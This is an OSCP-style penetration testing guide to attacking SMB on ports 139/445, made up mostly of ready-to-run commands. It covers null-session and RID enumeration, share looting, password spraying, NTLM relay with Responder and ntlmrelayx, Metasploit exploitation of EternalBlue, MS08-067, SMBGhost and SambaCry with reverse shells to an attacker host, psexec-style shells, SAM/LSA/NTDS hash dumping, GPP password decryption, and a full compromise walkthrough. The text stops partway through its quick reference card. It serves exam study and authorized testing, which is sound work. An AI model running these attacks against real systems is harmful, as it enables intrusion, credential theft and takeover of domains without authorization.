# SMB (Port 139/445) — Complete Deep-Dive OSCP Guide

> **Scope:** The most detailed SMB methodology — every tool, every technique, from discovery through null sessions, share enumeration, username/RID enumeration, password policy, spraying, relay attacks, known CVEs, exploitation, shell access, and post-access domain enumeration. `<ATTACKER_IP>` = your machine, `<TARGET_IP>` = the box you're testing.

---

## Table of Contents

1. [What is SMB — Deep Concept](#1-what-is-smb--deep-concept)
2. [Ports & Versions Reference](#2-ports--versions-reference)
3. [Step 1 — Port Discovery](#3-step-1--port-discovery)
4. [Step 2 — Nmap SMB Scripts (Full Set)](#4-step-2--nmap-smb-scripts-full-set)
5. [Step 3 — smbclient (Full Reference)](#5-step-3--smbclient-full-reference)
6. [Step 4 — enum4linux / enum4linux-ng (Full Reference)](#6-step-4--enum4linux--enum4linux-ng-full-reference)
7. [Step 5 — netexec / CrackMapExec (Full Reference)](#7-step-5--netexec--crackmapexec-full-reference)
8. [Step 6 — rpcclient (Full Reference)](#8-step-6--rpcclient-full-reference)
9. [Step 7 — smbmap (Full Reference)](#9-step-7--smbmap-full-reference)
10. [Step 8 — Impacket SMB Tools](#10-step-8--impacket-smb-tools)
11. [Step 9 — Null Session Deep Dive](#11-step-9--null-session-deep-dive)
12. [Step 10 — Share Enumeration & Looting](#12-step-10--share-enumeration--looting)
13. [Step 11 — Username & RID Enumeration](#13-step-11--username--rid-enumeration)
14. [Step 12 — Password Policy Enumeration](#14-step-12--password-policy-enumeration)
15. [Step 13 — Password Spraying (Every Tool)](#15-step-13--password-spraying-every-tool)
16. [Step 14 — SMB Relay & Signing Attacks](#16-step-14--smb-relay--signing-attacks)
17. [Step 15 — Known Vulnerabilities & Exploits (Full)](#17-step-15--known-vulnerabilities--exploits-full)
18. [Step 16 — Getting a Shell (Every Method)](#18-step-16--getting-a-shell-every-method)
19. [Step 17 — GPP / SYSVOL / NETLOGON Looting](#19-step-17--gpp--sysvol--netlogon-looting)
20. [Step 18 — Post-Access Domain Enumeration](#20-step-18--post-access-domain-enumeration)
21. [Full End-to-End Attack Walkthrough](#21-full-end-to-end-attack-walkthrough)
22. [Quick Reference Card](#22-quick-reference-card)

---

## 1. What is SMB — Deep Concept

**SMB (Server Message Block)** is Microsoft's network protocol for sharing files, printers, and named pipes, and for carrying authentication between machines. Every Windows domain environment runs on SMB underneath: file shares, Group Policy distribution (SYSVOL/NETLOGON), domain logon validation, and most lateral movement techniques (PsExec-family tools) all use SMB as their transport.

```
<ATTACKER_IP> ──SMB (139/445)──→ <TARGET_IP>
   - Authenticate (NTLM or Kerberos)
   - List/access shared folders (ADMIN$, C$, IPC$, custom shares)
   - Query domain info via RPC over SMB (SAMR, LSARPC pipes)
   - Execute commands remotely (via named pipes / service creation)
```

**Why SMB is the single highest-value port in OSCP-style Windows engagements:**
- It's open on almost every Windows host by default
- A huge amount of **unauthenticated information** can often be pulled before you have any credentials at all
- It's the foundation for **every PsExec-family lateral movement tool**
- Domain Controllers expose **SYSVOL/NETLOGON** over SMB — frequently containing leftover Group Policy Preference passwords
- Misconfigurations here (null sessions, SMB signing disabled, weak passwords) chain directly into full domain compromise in AD sets

---

## 2. Ports & Versions Reference

| Port | Service | Notes |
|---|---|---|
| **445** | SMB over TCP (direct) | The modern, primary target — always check this first |
| **139** | NetBIOS Session Service (SMB over NetBIOS) | Legacy transport, often still open alongside 445 |
| 137 | NetBIOS Name Service (UDP) | Name resolution; can leak the NetBIOS computer/domain name |
| 138 | NetBIOS Datagram Service (UDP) | Rarely useful directly |

| SMB Version | Introduced | Security Notes |
|---|---|---|
| SMBv1 | Windows NT/2000 era | Legacy, vulnerable to EternalBlue and others — should be disabled |
| SMBv2 | Windows Vista/Server 2008 | Improved, still has signing-related attack surface |
| SMBv3 | Windows 8/Server 2012+ | Adds encryption option, but SMBGhost (CVE-2020-0796) affects compression handling |

```bash
# Check which SMB dialects the target supports
nmap -p 445 --script smb-protocols <TARGET_IP>
```

---

## 3. Step 1 — Port Discovery

```bash
# Basic scan from <ATTACKER_IP> against <TARGET_IP>
nmap -p 139,445 <TARGET_IP>

# Version detection
nmap -sV -p 139,445 <TARGET_IP>

# Default scripts + version (this alone gives a LOT of free info)
nmap -sV -sC -p 139,445 <TARGET_IP>

# UDP NetBIOS name service (leaks hostname/domain even before SMB itself)
nmap -sU -p 137 <TARGET_IP>
nmblookup -A <TARGET_IP>

# Full aggressive scan
nmap -A -p 139,445 <TARGET_IP>

# Across a whole subnet — find every SMB host (useful once you're pivoted internally)
nmap -p 445 --open <TARGET_SUBNET>/24 -oG smb_hosts.txt
```

---

## 4. Step 2 — Nmap SMB Scripts (Full Set)

```bash
# OS and SMB version discovery
nmap -p 445 --script smb-os-discovery <TARGET_IP>

# Supported SMB protocol dialects
nmap -p 445 --script smb-protocols <TARGET_IP>

# Security mode — signing required or not (relevant for relay attacks)
nmap -p 445 --script smb-security-mode <TARGET_IP>

# Enumerate shares (works with null session if allowed)
nmap -p 445 --script smb-enum-shares --script-args smbusername=,smbpassword= <TARGET_IP>

# Enumerate users
nmap -p 445 --script smb-enum-users <TARGET_IP>

# Enumerate groups
nmap -p 445 --script smb-enum-groups --script-args smbusername=,smbpassword= <TARGET_IP>

# Enumerate domains
nmap -p 445 --script smb-enum-domains --script-args smbusername=,smbpassword= <TARGET_IP>

# Enumerate sessions
nmap -p 445 --script smb-enum-sessions --script-args smbusername=,smbpassword= <TARGET_IP>

# Server stats
nmap -p 445 --script smb-server-stats --script-args smbusername=,smbpassword= <TARGET_IP>

# Password policy
nmap -p 445 --script smb-enum-domains --script-args smbusername=,smbpassword= <TARGET_IP>

# System info
nmap -p 445 --script smb-system-info --script-args smbusername=,smbpassword= <TARGET_IP>

# Vulnerability checks — run ALL of these every time
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
nmap -p 445 --script smb-vuln-ms08-067 <TARGET_IP>
nmap -p 445 --script smb-vuln-cve2009-3103 <TARGET_IP>
nmap -p 445 --script smb-vuln-cve-2017-7494 <TARGET_IP>
nmap -p 445 --script smb-vuln-regsvc-dos <TARGET_IP>
nmap -p 445 --script smb-vuln-webexec <TARGET_IP>
nmap -p 445 --script "smb-vuln-*" <TARGET_IP>

# The full combined "give me everything" scan
nmap -p 139,445 --script "smb-os-discovery,smb-protocols,smb-security-mode,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-enum-sessions,smb-server-stats,smb-system-info,smb-vuln-*" --script-args smbusername=,smbpassword= -oN smb_full_scan.txt <TARGET_IP>
```

---

## 5. Step 3 — smbclient (Full Reference)

```bash
# List shares — null session
smbclient -L //<TARGET_IP> -N

# List shares — with credentials
smbclient -L //<TARGET_IP> -U 'user%password'
smbclient -L //<TARGET_IP> -U user
# (will prompt for password interactively)

# With domain specified
smbclient -L //<TARGET_IP> -U 'DOMAIN\user%password'

# Force a specific SMB protocol version (old/new server compatibility)
smbclient -L //<TARGET_IP> -N -m SMB2
smbclient -L //<TARGET_IP> -N -m SMB3
smbclient -L //<TARGET_IP> -N --option='client min protocol=NT1'   # force SMBv1, old servers

# Connect to a specific share
smbclient //<TARGET_IP>/sharename -N
smbclient //<TARGET_IP>/sharename -U 'user%password'

# Connect to default admin shares (need admin creds)
smbclient //<TARGET_IP>/C$ -U 'Administrator%P@ssw0rd'
smbclient //<TARGET_IP>/ADMIN$ -U 'Administrator%P@ssw0rd'

# === Inside an smbclient session ===
smb: \> ls                       # list current directory
smb: \> cd foldername             # change directory
smb: \> pwd                       # show current remote path
smb: \> lcd /tmp                  # change LOCAL directory (where downloads go)
smb: \> get file.txt               # download single file
smb: \> mget *                     # download all files (prompts per file by default)
smb: \> prompt off                 # disable per-file confirmation
smb: \> recurse on                 # enable recursive operations
smb: \> mget *                     # now downloads EVERYTHING recursively, no prompts
smb: \> put localfile.txt          # upload a file
smb: \> mput *                     # upload multiple files
smb: \> mkdir newfolder            # create remote directory
smb: \> rmdir folder               # remove remote directory
smb: \> del file.txt               # delete remote file
smb: \> rename old.txt new.txt     # rename remote file
smb: \> !pwd                       # run a LOCAL shell command (! prefix)
smb: \> !ls                        # list local files
smb: \> exit                       # close session

# Non-interactive — run a single command and exit
smbclient //<TARGET_IP>/sharename -N -c "ls"
smbclient //<TARGET_IP>/sharename -N -c "get secret.txt"
smbclient //<TARGET_IP>/sharename -N -c "prompt off; recurse on; mget *"
```

---

## 6. Step 4 — enum4linux / enum4linux-ng (Full Reference)

```bash
# Original enum4linux flags
enum4linux -a <TARGET_IP>        # ALL checks (the one you'll use most)
enum4linux -U <TARGET_IP>        # Users only
enum4linux -S <TARGET_IP>        # Shares only
enum4linux -G <TARGET_IP>        # Groups only
enum4linux -P <TARGET_IP>        # Password policy only
enum4linux -o <TARGET_IP>        # OS information only
enum4linux -r <TARGET_IP>        # RID cycling (user enum via SIDs)
enum4linux -i <TARGET_IP>        # Printer information
enum4linux -n <TARGET_IP>        # Full nmblookup-style name scan

# With credentials (gets MORE info than null session)
enum4linux -a -u 'user' -p 'password' <TARGET_IP>

# enum4linux-ng — modern Python rewrite, better/cleaner output
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt --break-system-packages

python3 enum4linux-ng.py -A <TARGET_IP>          # ALL checks
python3 enum4linux-ng.py -U <TARGET_IP>          # users
python3 enum4linux-ng.py -S <TARGET_IP>          # shares
python3 enum4linux-ng.py -P <TARGET_IP>          # password policy
python3 enum4linux-ng.py -o <TARGET_IP>          # OS info

# Save output as JSON/YAML for parsing
python3 enum4linux-ng.py -A <TARGET_IP> -oJ output.json
python3 enum4linux-ng.py -A <TARGET_IP> -oY output.yaml

# With credentials
python3 enum4linux-ng.py -A -u 'user' -p 'password' <TARGET_IP>
```

---

## 7. Step 5 — netexec / CrackMapExec (Full Reference)

```bash
# Install
sudo apt install netexec
# (older name, may still be referenced: crackmapexec / cme)

# Basic info gathering — no creds needed
netexec smb <TARGET_IP>

# With null session explicitly
netexec smb <TARGET_IP> -u '' -p ''
netexec smb <TARGET_IP> -u 'guest' -p ''

# With valid credentials
netexec smb <TARGET_IP> -u 'user' -p 'password'

# With NTLM hash (pass-the-hash)
netexec smb <TARGET_IP> -u 'user' -H 'NTLM_HASH'

# List shares
netexec smb <TARGET_IP> -u 'user' -p 'password' --shares

# Enumerate users (SAMR-based)
netexec smb <TARGET_IP> -u 'user' -p 'password' --users

# Enumerate groups
netexec smb <TARGET_IP> -u 'user' -p 'password' --groups

# Enumerate local admins
netexec smb <TARGET_IP> -u 'user' -p 'password' --local-groups

# RID brute force (works even with low-priv/null creds in many configs)
netexec smb <TARGET_IP> -u '' -p '' --rid-brute

# Password policy
netexec smb <TARGET_IP> -u '' -p '' --pass-pol

# Logged on users
netexec smb <TARGET_IP> -u 'user' -p 'password' --loggedon-users

# Check SMB signing (relevant for relay attacks)
netexec smb <TARGET_IP> --gen-relay-list relay_targets.txt

# Execute a command (requires admin-equivalent creds)
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami"
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -X "Get-Process"   # PowerShell

# Specify execution method explicitly
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami" --exec-method wmiexec
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami" --exec-method smbexec
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami" --exec-method atexec

# Dump SAM (if admin)
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' --sam

# Dump LSA secrets (if admin)
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' --lsa

# Dump NTDS.dit (if Domain Controller + admin)
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' --ntds

# Modules system (extends functionality)
netexec smb <TARGET_IP> -u 'user' -p 'password' -M spider_plus     # crawl all shares for files
netexec smb <TARGET_IP> -u 'user' -p 'password' -M gpp_password    # find GPP passwords automatically
```

---

## 8. Step 6 — rpcclient (Full Reference)

```bash
# Null session
rpcclient -U "" -N <TARGET_IP>

# With credentials
rpcclient -U 'user%password' <TARGET_IP>

# === Inside rpcclient session ===
rpcclient $> srvinfo                       # server info (OS version, type)
rpcclient $> enumdomusers                  # list all domain/local users
rpcclient $> enumdomgroups                 # list all groups
rpcclient $> enumalsgroups builtin          # list builtin alias groups
rpcclient $> querydominfo                  # domain info (SID, server name)
rpcclient $> getdompwinfo                  # password policy
rpcclient $> lsaquery                      # query LSA, get domain SID
rpcclient $> lookupnames administrator     # name → SID
rpcclient $> lookupnames Domain Admins     # group name → SID
rpcclient $> lookupsids S-1-5-21-XXX-XXX-XXX-500   # SID → name
rpcclient $> queryuser 0x1f4               # query user by RID (hex; 0x1f4 = 500 = Administrator)
rpcclient $> querygroup 0x200              # query group by RID
rpcclient $> queryusergroups 0x1f4         # what groups is this user in
rpcclient $> enumprinters                  # list shared printers
rpcclient $> netshareenum                  # enumerate network shares
rpcclient $> netshareenumall               # enumerate ALL shares (incl. hidden)
rpcclient $> getusrdompwinfo 0x1f4          # detailed password info for a user
rpcclient $> samlookupnames domain user administrator   # SAM lookup

# Manual RID cycling — script this for full user enumeration
for rid in $(seq 500 1100); do
    rpcclient -U "" -N <TARGET_IP> -c "queryuser 0x$(printf '%x' $rid)" 2>/dev/null | grep "User Name"
done
```

---

## 9. Step 7 — smbmap (Full Reference)

```bash
# Install
pip3 install smbmap --break-system-packages

# Basic scan — null session
smbmap -H <TARGET_IP>

# With credentials
smbmap -H <TARGET_IP> -u 'user' -p 'password'

# With domain
smbmap -H <TARGET_IP> -u 'user' -p 'password' -d DOMAIN

# Specify port (if non-default)
smbmap -H <TARGET_IP> -P 445 -u 'user' -p 'password'

# Recursive directory listing of a specific share
smbmap -H <TARGET_IP> -u 'user' -p 'password' -r sharename
smbmap -H <TARGET_IP> -u 'user' -p 'password' -R sharename   # capital R = recursive deep

# Download a specific file
smbmap -H <TARGET_IP> -u 'user' -p 'password' --download "sharename\path\to\file.txt"

# Download ALL files from accessible shares (use carefully — can be huge)
smbmap -H <TARGET_IP> -u 'user' -p 'password' -A '.*' -R

# Upload a file (only works on writable shares)
smbmap -H <TARGET_IP> -u 'user' -p 'password' --upload /local/file.txt "sharename\file.txt"

# Execute a command via admin share access
smbmap -H <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami"

# Search ALL shares for files matching a pattern (filename regex)
smbmap -H <TARGET_IP> -u 'user' -p 'password' -R --depth 5 -A "password"
```

---

## 10. Step 8 — Impacket SMB Tools

```bash
# === lookupsid.py — username/SID enumeration ===
impacket-lookupsid anonymous@<TARGET_IP>
impacket-lookupsid 'user:password@<TARGET_IP>'

# === smbclient.py — Python smb client, similar interactive style ===
impacket-smbclient 'user:password@<TARGET_IP>'
impacket-smbclient anonymous@<TARGET_IP>

# === GetADUsers.py — domain user enumeration (needs domain creds) ===
impacket-GetADUsers -all 'DOMAIN/user:password@<TARGET_IP>'

# === samrdump.py — dump SAM database info over the network ===
impacket-samrdump 'user:password@<TARGET_IP>'

# === reg.py — remote registry access (needs admin creds) ===
impacket-reg 'Administrator:P@ssw0rd@<TARGET_IP>' query -keyName 'HKLM\SOFTWARE'

# === secretsdump.py — dump SAM/LSA/NTDS hashes (needs admin creds) ===
impacket-secretsdump 'Administrator:P@ssw0rd@<TARGET_IP>'
impacket-secretsdump -hashes :NTLM_HASH 'Administrator@<TARGET_IP>'

# Output includes local SAM hashes, cached domain creds, and (on a DC) NTDS.dit hashes
```

---

## 11. Step 9 — Null Session Deep Dive

A **null session** is an SMB connection made with no username/password (or empty credentials) — historically a default-enabled misconfiguration, still very commonly found.

```bash
# Test methods — try ALL of these, servers may allow some but not others
smbclient -L //<TARGET_IP> -N
smbclient -L //<TARGET_IP> -U '' -N
rpcclient -U "" -N <TARGET_IP>
rpcclient -U "%" <TARGET_IP>
netexec smb <TARGET_IP> -u '' -p ''
netexec smb <TARGET_IP> -u 'guest' -p ''
netexec smb <TARGET_IP> -u 'anonymous' -p 'anonymous'

# Full sweep with enum4linux (tries multiple null session variants internally)
enum4linux -a <TARGET_IP>

# What a successful null session typically leaks:
echo "[*] Shares:"
smbclient -L //<TARGET_IP> -N

echo "[*] Users via RID cycling:"
enum4linux -r <TARGET_IP>

echo "[*] Password policy:"
enum4linux -P <TARGET_IP>

echo "[*] OS info:"
enum4linux -o <TARGET_IP>

echo "[*] Domain SID:"
rpcclient -U "" -N <TARGET_IP> -c "lsaquery"
```

---

## 12. Step 10 — Share Enumeration & Looting

```bash
# Step 1 — list all shares
smbclient -L //<TARGET_IP> -N

# Step 2 — connect to EACH custom (non-default) share and enumerate
smbclient //<TARGET_IP>/Public -N -c "ls"
smbclient //<TARGET_IP>/Backups -N -c "ls"

# Step 3 — bulk download approach with smbclient
smbclient //<TARGET_IP>/Public -N -c "prompt off; recurse on; mget *"

# Step 4 — mount for offline analysis (Linux attacker)
mkdir /mnt/smbshare
sudo mount -t cifs //<TARGET_IP>/Public /mnt/smbshare -o username=guest,password=
sudo mount -t cifs //<TARGET_IP>/Public /mnt/smbshare -o username=user,password=password,domain=CORP

# Older server compatibility (force SMBv1)
sudo mount -t cifs //<TARGET_IP>/Public /mnt/smbshare -o username=user,password=password,vers=1.0

# Step 5 — search mounted content offline (much faster than over-the-wire grep)
find /mnt/smbshare -type f 2>/dev/null
grep -ril "password" /mnt/smbshare/ 2>/dev/null
find /mnt/smbshare -iname "*.config" -o -iname "*.xml" -o -iname "*.ps1" -o -iname "*.bak"

# Step 6 — automated full-share crawl with netexec's spider_plus module
netexec smb <TARGET_IP> -u 'user' -p 'password' -M spider_plus
# Saves a JSON map of every file across every accessible share

# Step 7 — unmount when done
sudo umount /mnt/smbshare
```

---

## 13. Step 11 — Username & RID Enumeration

```bash
# Why RID cycling works: well-known RIDs are predictable
# 500 = Administrator (built-in, always exists)
# 501 = Guest
# 512 = Domain Admins
# 513 = Domain Users
# 1000+ = custom created accounts (sequential)

# enum4linux automated RID cycling
enum4linux -r <TARGET_IP>

# netexec RID brute
netexec smb <TARGET_IP> -u '' -p '' --rid-brute

# Manual via rpcclient (full control over RID range)
rpcclient -U "" -N <TARGET_IP>
rpcclient $> lookupsids S-1-5-21-1234567890-987654321-1122334455-500
rpcclient $> lookupsids S-1-5-21-1234567890-987654321-1122334455-501
rpcclient $> lookupsids S-1-5-21-1234567890-987654321-1122334455-1000
rpcclient $> lookupsids S-1-5-21-1234567890-987654321-1122334455-1001

# Impacket lookupsid (automates the iteration)
impacket-lookupsid anonymous@<TARGET_IP>
# Iterates a default RID range automatically, prints all resolved names

# Specify a custom RID range
impacket-lookupsid anonymous@<TARGET_IP> 10000
# (10000 = how many RIDs to check)
```

---

## 14. Step 12 — Password Policy Enumeration

**Always do this BEFORE any spraying** — knowing the lockout threshold tells you exactly how many guesses per account are safe.

```bash
netexec smb <TARGET_IP> -u '' -p '' --pass-pol

enum4linux -P <TARGET_IP>

rpcclient -U "" -N <TARGET_IP> -c "getdompwinfo"

nmap -p 445 --script smb-enum-domains --script-args smbusername=,smbpassword= <TARGET_IP>

# What to look for in the output:
# min_pwd_length         → minimum password length policy
# pwd_complexity         → complexity requirements enabled/disabled
# pwd_history_length     → how many old passwords are remembered
# lockout_threshold      → number of bad attempts before lockout (0 = no lockout!)
# lockout_duration       → how long the lockout lasts
# lockout_window         → time window the threshold counts within

# If lockout_threshold = 0 → NO LOCKOUT POLICY, full brute force is safe
# If lockout_threshold = 5 → you get 4 safe guesses per account before risking lockout
```

---

## 15. Step 13 — Password Spraying (Every Tool)

### netexec (preferred, most flexible)

```bash
# Single password, many users
netexec smb <TARGET_IP> -u users.txt -p 'Summer2024!'

# Across a subnet (find every host these creds work on)
netexec smb <TARGET_SUBNET>/24 -u users.txt -p 'Summer2024!'

# Continue testing after first success (map every valid account)
netexec smb <TARGET_IP> -u users.txt -p 'Summer2024!' --continue-on-success

# Full combo (use sparingly — risk of lockouts without policy awareness)
netexec smb <TARGET_IP> -u users.txt -p passwords.txt

# Pass-the-hash spray
netexec smb <TARGET_IP> -u users.txt -H 'NTLM_HASH'

# Local accounts spray (try Administrator with known leaked local password across many hosts)
netexec smb <TARGET_SUBNET>/24 -u Administrator -p 'P@ssw0rd' --local-auth
```

### Hydra

```bash
hydra -L users.txt -p 'Summer2024!' <TARGET_IP> smb
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb

# User-as-own-password technique
while read u; do echo "$u:$u"; done < users.txt > userpass.txt
hydra -C userpass.txt <TARGET_IP> smb
```

### Medusa

```bash
medusa -h <TARGET_IP> -U users.txt -p 'Summer2024!' -M smbnt
```

### Kerbrute (Active Directory specifically — uses Kerberos pre-auth, very fast & quiet)

```bash
git clone https://github.com/ropnop/kerbrute.git

# Enumerate valid usernames against the KDC
kerbrute userenum -d domain.local --dc <TARGET_IP> users.txt

# Password spray
kerbrute passwordspray -d domain.local --dc <TARGET_IP> users.txt 'Summer2024!'

# Single user brute force
kerbrute bruteuser -d domain.local --dc <TARGET_IP> /usr/share/wordlists/rockyou.txt jsmith
```

### Metasploit

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## 16. Step 14 — SMB Relay & Signing Attacks

If SMB signing is **not required** on a target, NTLM relay attacks become possible — capturing an authentication attempt from one host and relaying it to authenticate against another.

```bash
# Check signing requirements across the network
netexec smb <TARGET_SUBNET>/24 --gen-relay-list relay_targets.txt
# Produces a list of hosts WITHOUT signing enforcement — valid relay targets

# Manual signing check per host
nmap -p 445 --script smb-security-mode <TARGET_IP>
# Look for: "Message signing enabled but not required" = relay-able

# Responder — capture hashes/auth attempts on the local network
sudo responder -I eth0

# ntlmrelayx — relay captured auth to a target without signing
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Combined workflow: Responder captures auth attempt → ntlmrelayx relays it
# to a non-signing host → executes commands there
```

---

## 17. Step 15 — Known Vulnerabilities & Exploits (Full)

### MS17-010 / EternalBlue

```bash
# Detection
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <LPORT>
run

# Alternative module (more stable on some targets)
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
run
```

### MS08-067

```bash
nmap -p 445 --script smb-vuln-ms08-067 <TARGET_IP>

msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <TARGET_IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <LPORT>
run
```

### SMBGhost (CVE-2020-0796)

```bash
nmap -sV -p 445 <TARGET_IP>
# Check for Windows 10 1903/1909 in version string

msfconsole
search SMBGhost
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS <TARGET_IP>
run
```

### CVE-2017-7494 (Samba "SambaCry" — Linux SMB equivalent of EternalBlue)

```bash
nmap -p 445 --script smb-vuln-cve-2017-7494 <TARGET_IP>

msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS <TARGET_IP>
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
run
```

### WebExec (CVE-2019-10880-style misconfig in some endpoint products)

```bash
nmap -p 445 --script smb-vuln-webexec <TARGET_IP>
```

```bash
# Always check version against searchsploit too
searchsploit samba
searchsploit "windows smb"
```

---

## 18. Step 16 — Getting a Shell (Every Method)

Once you have valid creds (from spraying, found elsewhere, hash dumps) and SMB confirmed open:

```bash
# impacket-psexec — drops a service binary, gives SYSTEM shell
impacket-psexec 'Administrator:P@ssw0rd@<TARGET_IP>'
impacket-psexec -hashes :NTLM_HASH 'Administrator@<TARGET_IP>'

# impacket-wmiexec — stealthier, no file dropped, semi-interactive
impacket-wmiexec 'Administrator:P@ssw0rd@<TARGET_IP>'

# impacket-smbexec — temporary per-command service
impacket-smbexec 'Administrator:P@ssw0rd@<TARGET_IP>'

# impacket-atexec — single command via Task Scheduler
impacket-atexec 'Administrator:P@ssw0rd@<TARGET_IP>' "whoami"

# netexec direct execution
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' -x "whoami"

# Original Sysinternals PsExec.exe (if working from Windows attacker)
PsExec.exe \\<TARGET_IP> -u Administrator -p P@ssw0rd -s cmd.exe

# If WinRM also open — evil-winrm is generally preferred (full PowerShell)
evil-winrm -i <TARGET_IP> -u Administrator -p 'P@ssw0rd'

# Metasploit handler to catch a reverse shell payload if delivered via share/exploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <LPORT>
run -j
```

---

## 19. Step 17 — GPP / SYSVOL / NETLOGON Looting

On Domain Controllers, the SYSVOL and NETLOGON shares are accessible (often even with low-priv domain creds) and may contain leftover Group Policy Preference files with embedded, weakly "encrypted" passwords.

```bash
# Connect to SYSVOL
smbclient //<TARGET_IP>/SYSVOL -U 'user%password'
smbclient //<TARGET_IP>/NETLOGON -U 'user%password'

# Search for Groups.xml (the file that stores GPP passwords)
smbclient //<TARGET_IP>/SYSVOL -U 'user%password' -c "prompt off; recurse on; mget Groups.xml"

# Or mount and search
sudo mount -t cifs //<TARGET_IP>/SYSVOL /mnt/sysvol -o username=user,password=password,domain=CORP
find /mnt/sysvol -iname "Groups.xml" 2>/dev/null
find /mnt/sysvol -iname "*.xml" -exec grep -l "cpassword" {} \;

# Decrypt the found cpassword value — uses a publicly known, fixed Microsoft AES key
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Manual decryption with CrackMapExec's built-in module
netexec smb <TARGET_IP> -u 'user' -p 'password' -M gpp_password
netexec smb <TARGET_IP> -u 'user' -p 'password' -M gpp_autologin
```

---

## 20. Step 18 — Post-Access Domain Enumeration

Once you have valid domain credentials (any level), pull as much AD structure as possible.

```bash
# Full user/group/share dump
netexec smb <TARGET_IP> -u 'user' -p 'password' --users
netexec smb <TARGET_IP> -u 'user' -p 'password' --groups
netexec smb <TARGET_IP> -u 'user' -p 'password' --shares
netexec smb <TARGET_IP> -u 'user' -p 'password' --local-groups
netexec smb <TARGET_IP> -u 'user' -p 'password' --loggedon-users

# BloodHound data collection (the real AD enumeration powerhouse — separate dedicated topic)
netexec smb <TARGET_IP> -u 'user' -p 'password' --bloodhound -c All --dns-server <TARGET_IP>

# Detailed AD user info via impacket
impacket-GetADUsers -all 'CORP.LOCAL/user:password@<TARGET_IP>'

# Dump local SAM (if local admin)
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' --sam
impacket-secretsdump 'Administrator:P@ssw0rd@<TARGET_IP>'

# If this IS the Domain Controller and you have Domain Admin — full NTDS dump
impacket-secretsdump 'CORP.LOCAL/Administrator:P@ssw0rd@<TARGET_IP>'
netexec smb <TARGET_IP> -u 'Administrator' -p 'P@ssw0rd' --ntds
```

---

## 21. Full End-to-End Attack Walkthrough

**Scenario:** `<ATTACKER_IP>` scanning `<TARGET_IP>`. Ports 139/445 open.

**Step 1 — Discover:**
```bash
nmap -sV -sC -p 139,445 <TARGET_IP>
# 445/tcp open microsoft-ds  Windows Server 2016
```

**Step 2 — Null session sweep:**
```bash
smbclient -L //<TARGET_IP> -N
# Sharename: Public, Backups, IPC$

enum4linux -a <TARGET_IP>
# Users found: jsmith, bwhite, svc_backup
```

**Step 3 — Password policy check:**
```bash
netexec smb <TARGET_IP> -u '' -p '' --pass-pol
# lockout_threshold: 0   ← no lockout, safe to be more aggressive
```

**Step 4 — Loot the Public/Backups shares:**
```bash
smbclient //<TARGET_IP>/Backups -N -c "prompt off; recurse on; mget *"
grep -ril "password" ./Backups/
# Found: backup_script.ps1 contains: $cred = "svc_backup:B@ckup2024!"
```

**Step 5 — Validate found credential:**
```bash
netexec smb <TARGET_IP> -u 'svc_backup' -p 'B@ckup2024!'
# [+] CORP\svc_backup:B@ckup2024! (Pwn3d!)
```

**Step 6 — Get a shell:**
```bash
impacket-psexec 'svc_backup:B@ckup2024!@<TARGET_IP>'
# C:\Windows\system32> whoami
# nt authority\system
```

**Step 7 — Dump hashes and check for SYSVOL GPP leftovers:**
```bash
impacket-secretsdump 'svc_backup:B@ckup2024!@<TARGET_IP>'

smbclient //<TARGET_IP>/SYSVOL -U 'svc_backup%B@ckup2024!' -c "recurse on; prompt off; mget Groups.xml"
gpp-decrypt "FOUND_CPASSWORD_HERE"
```

**Step 8 — Grab the flag:**
```bash
type C:\Users\Administrator\Desktop\proof.txt
```

---

## 22. Quick Reference Card

```
====================================================================
 SMB DEEP-DIVE — OSCP QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = the box being tested
====================================================================

[DISCOVERY]
  nmap -sV -sC -p 139,445 <TARGET_IP>
  nmap -p 445 --script "smb-vuln-*" <TARGET_IP>

[NULL SESSION — TRY ALL VARIANTS]
  smbclient -L //<TARGET_IP> -N
  rpcclient -U "" -N <TARGET_IP>
  netexec smb <TARGET_IP> -u '' -p ''

[FULL ENUMERATION]
  enum4linux -a <TARGET_IP>
  python3 enum4linux-ng.py -A <TARGET_IP>
  netexec smb <TARGET_IP> -u '' -p '' --shares --users --pass-pol --rid-brute

[SHARE ACCESS & LOOT]
